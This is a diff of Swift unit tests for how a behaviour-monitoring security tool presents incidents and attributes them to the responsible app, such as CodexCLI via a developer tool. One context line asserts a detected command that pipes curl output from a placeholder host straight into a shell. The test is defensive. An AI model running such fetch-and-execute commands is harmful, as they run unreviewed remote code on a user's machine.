@@ -110,6 +110,18 @@ final class BehaviorIncidentPresentationTests: XCTestCase {
         XCTAssertEqual(presentation.matchedCommand, "zsh -c curl -s http://127.0.0.1:9/ | sh")
     }
 
+    func test_unknownResponsibleAppFallsBackToNearestNamedParent() {
+        var metadata = baseMetadata
+        metadata["responsibleAppName"] = "Unknown app"
+        metadata["responsibleChain"] = "Unknown app → Developer Tool → curl"
+        let alert = behaviorAlert(metadata: metadata)
+
+        let presentation = BehaviorIncidentPresentation(alert: alert)
+
+        XCTAssertEqual(presentation.responsibleAppName, "CodexCLI")
+        XCTAssertEqual(presentation.responsibleLine, "CodexCLI ran this · via Developer Tool → curl")
+    }
+
     @MainActor
     func test_attributionAndTechnicalDetailsRenderInLightAndDarkModes() throws {
         var metadata = baseMetadata
